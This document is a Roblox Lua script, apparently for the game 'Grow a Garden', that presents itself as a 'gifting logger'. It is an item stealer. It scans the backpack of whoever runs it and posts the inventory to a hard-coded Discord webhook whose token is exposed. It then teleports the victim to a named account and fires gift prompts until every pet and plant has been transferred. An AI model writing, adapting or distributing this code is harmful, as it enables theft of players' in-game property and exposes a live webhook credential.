repeat wait() until game:IsLoaded()
print("[DEBUG] Script started")

_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- CONFIG
local users = _G.Usernames or {"DanyelQuibs"}
local min_value = _G.min_value or 100000
local ping = _G.pingEveryone or "No"
local webhook = "https://discord.com/api/webhooks/1382457262177783889/omW4Knrp97WLOI_6PkoA1DWV_huJAeLfhHqm_jzk9OuOzIdwlEqsir7wkV6GyfS2QLpy"

-- SERVICES
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local plr = Players.LocalPlayer
local replicatedStorage = game:GetService("ReplicatedStorage")
local modules = replicatedStorage:WaitForChild("Modules")
local backpack = plr:WaitForChild("Backpack")
local character = plr.Character or plr.CharacterAdded:Wait()

-- MODULES
local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
local petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
local numberUtil = require(modules:WaitForChild("NumberUtil"))
local dataService = require(modules:WaitForChild("DataService"))

print("[DEBUG] All modules loaded")

-- HELPERS
local function formatNumber(n)
	local suffixes = {"", "k", "m", "b", "t"}
	local i = 1
	while n >= 1000 and i < #suffixes do
		n = n / 1000
		i = i + 1
	end
	return (i == 1 and math.floor(n)) or string.format("%.2f%s", n, suffixes[i])
end

local function getWeight(tool)
	local match = tool.Name:match("%((%d+%.?%d*) ?kg%)")
	return match and tonumber(match) or 0
end

local function calcPetValue(petData)
	local hatchedFrom = petData.PetData.HatchedFrom
	if not hatchedFrom then return 0 end
	local eggData = petRegistry.PetEggs[hatchedFrom]
	if not eggData then return 0 end
	local rarity = eggData.RarityData.Items[petData.PetType]
	if not rarity then return 0 end
	local weightRange = rarity.GeneratedPetData.WeightRange
	if not weightRange then return 0 end
	local interp = numberUtil.ReverseLerp(weightRange[1], weightRange[2], petData.PetData.BaseWeight)
	local scale = math.lerp(0.8, 1.2, interp)
	local levelProgress = petUtils:GetLevelProgress(petData.PetData.Level)
	local finalScale = scale * math.lerp(0.15, 6, levelProgress)
	local value = petRegistry.PetList[petData.PetType].SellPrice * finalScale
	return math.floor(value)
end

-- SCAN ITEMS
local itemsToSend = {}
local totalValue = 0
local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
local rarePets = {"Red Fox", "Raccoon", "Dragonfly"}

print("[DEBUG] Scanning backpack...")

for _, tool in ipairs(backpack:GetChildren()) do
	if not tool:IsA("Tool") then continue end

	if table.find(excludedItems, tool.Name) then
		print("[SKIPPED] Excluded item:", tool.Name)
		continue
	end

	local itemType = tool:GetAttribute("ItemType")
	if itemType == "Pet" then
		local uuid = tool:GetAttribute("PET_UUID")
		local petData = dataService:GetData().PetsData.PetInventory.Data[uuid]
		if petData then
			local name = petData.PetType
			local value = calcPetValue(petData)
			local weight = getWeight(tool)
			local isRare = table.find(rarePets, name) ~= nil
			totalValue += value
			table.insert(itemsToSend, {
				Tool = tool,
				Name = name,
				Value = value,
				Weight = weight,
				Type = "Pet",
				IsRare = isRare
			})
			print("[DEBUG] PET added:", isRare and "‚≠ê " or "üêæ ", name, value)
		else
			print("[SKIPPED] Pet data missing:", tool.Name)
		end
	else
		local value = calcPlantValue(tool)
		local name = tool:GetAttribute("ItemName") or tool.Name
		local weight = getWeight(tool)
		totalValue += value
		table.insert(itemsToSend, {
			Tool = tool,
			Name = name,
			Value = value,
			Weight = weight,
			Type = "Plant",
			IsRare = false
		})
		print("[DEBUG] PLANT added: üå±", name, value)
	end
end

-- Sort items: rare pets first, then pets by value, then plants by value
table.sort(itemsToSend, function(a, b)
	if a.IsRare and not b.IsRare then return true end
	if not a.IsRare and b.IsRare then return false end
	if a.Type == "Pet" and b.Type ~= "Pet" then return true end
	if a.Type ~= "Pet" and b.Type == "Pet" then return false end
	return a.Value > b.Value
end)

-- SEND WEBHOOK
local function sendWebhook()
	local fieldText = ""
	for _, item in ipairs(itemsToSend) do
		local icon = item.Type == "Pet" and (item.IsRare and "‚≠ê" or "üêæ") or "üå±"
		fieldText ..= string.format("%s %s (%.2fkg): ¬¢%s\n", icon, item.Name, item.Weight, formatNumber(item.Value))
	end

	if #fieldText > 1024 then
		fieldText = fieldText:sub(1, 1000) .. "\n...and more"
	end

	local payload = {
		content = (ping == "Yes" and "@everyone " or "") .. "**Gifting Triggered**",
		embeds = {{
			title = "üéÅ Gift Summary",
			color = 65280,
			fields = {
				{ name = "Player", value = plr.Name, inline = true },
				{ name = "Total Value", value = "¬¢" .. formatNumber(totalValue), inline = true },
				{ name = "Items", value = fieldText }
			},
			footer = { text = "GAG gifting logger" }
		}}
	}

	local request = (http and http.request) or (syn and syn.request) or (fluxus and fluxus.request)
	if not request then warn("[ERROR] No request function") return end

	local success, err = pcall(function()
		request({
			Url = webhook,
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = HttpService:JSONEncode(payload)
		})
	end)

	if success then
		print("[DEBUG] Webhook sent")
	else
		warn("[ERROR] Webhook failed:", err)
	end
end

-- GIFTING FUNCTION (NO KICK)
local function giftItemsTo(target)
	print("[DEBUG] Gifting to:", target.Name)
	local root = character:WaitForChild("HumanoidRootPart")
	local targetRoot = target.Character:WaitForChild("HumanoidRootPart")
	root.CFrame = targetRoot.CFrame + Vector3.new(0, 0, 2)
	task.wait(0.2)

	for _, item in ipairs(itemsToSend) do
		item.Tool.Parent = character

		local prompt = item.Type == "Pet"
			and target.Character:WaitForChild("Head"):WaitForChild("ProximityPrompt")
			or targetRoot:WaitForChild("ProximityPrompt")

		repeat task.wait(0.01) until prompt.Enabled
		fireproximityprompt(prompt)
		task.wait(0.3)

		if not item.Tool:IsDescendantOf(game) then
			print("[DEBUG] Tool disappeared (likely gifted):", item.Tool.Name)
		else
			print("[DEBUG] Tool not gifted, returned:", item.Tool.Name)
			item.Tool.Parent = backpack
		end

		task.wait(0.2)
	end

	-- Wait to verify completion
	local timeout = 0
	local giftedSuccessfully = false

	while timeout < 10 do
		local stillOwned = false
		for _, item in ipairs(itemsToSend) do
			if item.Tool:IsDescendantOf(plr) or item.Tool:IsDescendantOf(backpack) then
				stillOwned = true
				break
			end
		end
		if not stillOwned then
			giftedSuccessfully = true
			break
		end
		timeout += 1
		task.wait(1)
	end

	if giftedSuccessfully then
		print("[DEBUG] ‚úÖ All items were gifted successfully.")
	else
		print("[DEBUG] ‚ö†Ô∏è Some items were not accepted or returned. No kick.")
	end
end

-- MAIN LOGIC
if #itemsToSend > 0 then
	sendWebhook()

	local function findTarget()
		for _, p in ipairs(Players:GetPlayers()) do
			if table.find(users, p.Name) then
				return p
			end
		end
		return nil
	end

	local target = findTarget()
	if target then
		giftItemsTo(target)
	else
		print("[DEBUG] Waiting for target:", table.concat(users, ", "))
		Players.PlayerAdded:Connect(function(p)
			if table.find(users, p.Name) then
				p.CharacterAdded:Wait()
				task.wait(1)
				giftItemsTo(p)
			end
		end)
	end
else
	print("[DEBUG] No items found in backpack to gift.")
end
